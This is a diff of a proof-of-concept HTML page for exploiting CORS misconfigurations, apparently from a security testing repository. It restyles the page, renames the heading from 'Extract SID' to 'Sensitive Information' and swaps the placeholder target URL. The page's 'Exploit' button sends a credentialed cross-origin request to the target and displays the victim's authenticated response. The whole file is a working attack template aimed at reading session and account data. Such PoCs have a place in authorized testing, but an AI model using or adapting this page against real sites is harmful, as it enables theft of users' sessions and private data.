@@ -2,9 +2,10 @@
 <html>
 <body>
 <center>
-<h2>CORS POC Exploit</h2>
-<h3>Extract SID</h3>
- 
+<h1 style="color:aqua;">CORS POC</h1>
+<h2 style="color:aqua;">Sensitive Information</h2>
+<body style="background-color:blueviolet;">
+  
 <div id="demo">
 <button type="button" onclick="cors()">Exploit</button>
 </div>
@@ -17,7 +18,7 @@ function cors() {
       document.getElementById("demo").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://vulnerable.com/url", true);
+  xhttp.open("GET", "https://target.com/URL", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
@@ -25,3 +26,4 @@ function cors() {
  
 </body>
 </html>
+
